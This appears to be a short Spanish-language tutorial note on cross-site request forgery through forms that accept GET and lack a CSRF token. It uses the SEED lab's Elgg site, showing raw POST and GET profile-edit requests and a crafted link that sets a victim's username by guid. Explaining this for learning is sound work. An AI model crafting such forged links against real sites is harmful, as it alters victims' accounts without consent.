Estas vulnerabilidades la verdad que son muy dificiles de encontrar por la cantidad de tokens que se utilizan hoy en dia, pero se enseña mas por "historia" que por utilidad, ademas puede ser util saberlo para entender como funcionan y porque surgen los tokens. 

--------
Esta vulnerabilidad se produce cuando podemos enviar un formulario por GET y no tiene un token CSRF, ya que podemos manipular un link, supongamos que tenemos la siguiente request para cambiar un nombre de usuario, por ejemplo:

```bash
POST /action/profile/edit HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundaryca0c72b1d721e9a15a6f45a211f82844
Content-Length: 2905
Origin: http://www.seed-server.com
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice/edit
Cookie: Elgg=tjpn5qetlhj1va4eefa0i5dno9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

------geckoformboundaryca0c72b1d721e9a15a6f45a211f82844
Content-Disposition: form-data; name="name"

NOMBRE_DE_USUARIO_NUEVO
```

Si lo cambiamos a GET, se veria algo asi:

```bash
GET /action/profile/edit?name=NOMBRE_DE_USUARIO_NUEVO&guid=56 HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Origin: http://www.seed-server.com
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice/edit
Cookie: Elgg=tjpn5qetlhj1va4eefa0i5dno9
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

Nosotros podemos manipular el enlace y que se vea algo asi:

https://url/action/profile/edit?name=NOMBRE_DE_USUARIO_NUEVO&guid=ID_DE_LA_VICTIMA
-----
Puede haber mas chances de encontrarlo en paneles internos, pero por lo general es muy poco comun.

